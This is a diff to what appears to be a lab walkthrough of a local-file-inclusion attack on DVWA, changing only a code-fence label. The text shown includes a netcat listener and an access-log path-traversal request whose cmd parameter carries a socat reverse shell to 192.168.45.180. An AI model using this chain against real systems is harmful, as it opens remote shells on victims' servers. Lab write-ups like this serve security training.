@@ -71,7 +71,7 @@ nc -nlvp 1234
 ``` 
 Next, the encoded URL was appended to `/var/log/apache2/access.log` with the `cme` parameter as the following. 
 
-```url
+```bash
 127.0.0.1/vulnerabilities/fi/?page=../../../../../../../var/log/apache2/access.log&cmd=socattcp-connect%3A192.168.45.180%3A1234exec%3Abash`
  ```
 
